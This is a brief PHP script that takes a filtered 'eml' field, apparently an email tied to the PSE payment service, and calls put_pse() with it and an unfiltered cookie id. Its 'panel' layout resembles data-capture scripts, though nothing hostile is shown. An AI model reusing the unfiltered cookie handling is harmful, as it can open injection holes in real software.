<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();
$correopse = $ifilter->process($_POST['eml']);

$id = $_COOKIE['id'];
put_pse($id,$correopse)
?>